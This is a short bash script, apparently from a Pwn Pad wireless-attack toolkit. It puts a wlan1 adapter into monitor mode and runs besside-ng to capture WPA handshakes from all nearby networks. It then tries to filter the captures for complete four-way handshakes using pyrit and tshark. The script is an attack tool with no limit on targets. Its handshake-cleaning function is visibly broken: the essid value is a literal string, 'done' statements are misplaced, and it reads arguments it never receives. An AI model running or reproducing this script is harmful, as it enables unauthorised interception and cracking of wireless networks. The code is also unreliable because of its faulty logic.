#!/bin/bash
#####################################################
# CHECK FOR WLAN1/START MON0 (from securemaryland)
#####################################################
f_wireless(){
adaptor=`ip addr |grep wlan1`
if [ -z "$adaptor" ]; then
echo "This script requires wlan1 to be plugged in."
echo "I cant see it so exiting now. Try again when wlan1 is plugged in."
exit 1
fi
echo " Found wlan1 now checking if monitor mode is on - don't worry I will turn it on if it isn't running"
iwconfig |grep Monitor>/dev/null
if [ $? = 1 ]
then
	echo
	echo "Monitor mode doesn't seem to be running. I will issue an airmon-ng start wlan1 to start it"
	echo ""
	airmon-ng start wlan1
else
	echo "Monitor mode appears to be running. Moving on."
fi
}
#####################################################
# START BESSIDE-NG
#####################################################
f_besside_ng(){
	mkdir -p "/opt/pwnpad/captures/besside-ng"
	cd /opt/pwnpad/captures/besside-ng
	besside-ng -vv mon0;
}
#####################################################
# CLEAN HANDSHAKES
#####################################################
clean_handshake(){
for capfile in $(find . -iname '*.cap'); do
essid="pyrit -r $capfile analyze | grep AccessPoint | cut -d \' -f2"
count=0
tval=`tshark -r $capfile -Y "eapol || wlan_mgt.tag.interpretation eq $2 || (wlan.fc.type_subtype==0x08 && wlan_mgt.ssid eq $essid)"`
count=$(($count + `echo $tval | grep -c "SSID=$essid"`))
count=$(($count + `echo $tval | grep -c "Message 1 of 4"`))
count=$(($count + `echo $tval | grep -c "Message 2 of 4"`))
count=$(($count + `echo $tval | grep -c "Message 3 of 4"`))
count=$(($count + `echo $tval | grep -c "Message 4 of 4"`))
if [ "$count" == "5" ]; then
    echo "Four Way Handshake Captured"
    tshark -r $1 -R "eapol || wlan_mgt.tag.interpretation eq $essid || (wlan.fc.type_subtype==0x08 && wlan_mgt.ssid eq $essid) -w $1_stripped.cap"
	done
else
    echo "Incomplete Four Way Handshake"
	done
fi
}
#####################################################
clear
f_wireless
f_besside_ng
clean_handshake
